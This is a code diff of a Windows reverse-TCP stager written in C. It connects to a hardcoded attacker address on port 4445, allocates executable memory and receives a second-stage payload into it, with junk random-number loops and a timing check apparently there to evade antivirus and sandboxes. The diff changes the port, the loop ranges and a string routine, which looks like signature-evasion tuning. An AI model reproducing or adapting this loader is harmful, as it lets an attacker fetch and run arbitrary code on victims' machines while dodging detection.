@@ -75,21 +75,15 @@ int random_in_range (unsigned int min, unsigned int max)
   }
 }
 
-
-
 char* rev(char* str)
 {
-  int end= strlen(str)-1;
-  int start = 0;
+  int end=strlen(str)-1;
+  int start = 5;
 
   while( start<end )
   {
-    str[start] ^= str[end];
-    str[end] ^=   str[start];
-    str[start]^= str[end];
-
+    str[start] ^= 1;
     ++start;
-    --end;
   }
 
   return str;
@@ -105,9 +99,7 @@ int main(int argc) {
 	int num1, num2, num3;
 
 	strcpy(argv[1],"10.1.225.101");
-	strcpy(argv[2],"4444");
-
-
+	strcpy(argv[2],"4445");
 
 	MSG msg;
 	DWORD tc;
@@ -121,24 +113,24 @@ int main(int argc) {
 	if (((GetTickCount() - tc) / 300) != 2)
 		return 0;
 
-
-
-
 	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
 	int count = recv(my_socket, (char *)&size, 4, 0);
 	if (count != 4 || size <= 0)
 		Kick(my_socket, "bad length value\n");
+
 	while (num1<=5) {
-		num1=random_in_range(0,1000);
-		num2=random_in_range(0,1000);
-   		num3=random_in_range(0,1000);
+		num1=random_in_range(0,10000);
+		num2=random_in_range(0,10000);
+   		num3=random_in_range(0,10000);
 	}
 	num1=0;
+	
 	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
 	while (num1<=5) {
-		num1=random_in_range(0,1000);
-		num2=random_in_range(0,1000);
-   		num3=random_in_range(0,1000);
+		num1=random_in_range(0,10000);
+		num2=random_in_range(0,10000);
+   		num3=random_in_range(0,10000);
 	}
 	num1=0;
 	if (buffer == NULL)
@@ -146,16 +138,16 @@ int main(int argc) {
 	buffer[0] = 0xBF;
 	
 	while (num1<=5) {
-		num1=random_in_range(0,1000);
-		num2=random_in_range(0,1000);
-   		num3=random_in_range(0,1000);
+		num1=random_in_range(0,10000);
+		num2=random_in_range(0,10000);
+   		num3=random_in_range(0,10000);
 	}
 	num1=0;
 	memcpy(buffer + 1, &my_socket, 4);
 	while (num1<=5) {
-		num1=random_in_range(0,1000);
-		num2=random_in_range(0,1000);
-   		num3=random_in_range(0,1000);
+		num1=random_in_range(0,10000);
+		num2=random_in_range(0,10000);
+   		num3=random_in_range(0,10000);
 	}
 	num1=0;
 	count = recv_all(my_socket, buffer + 5, size);
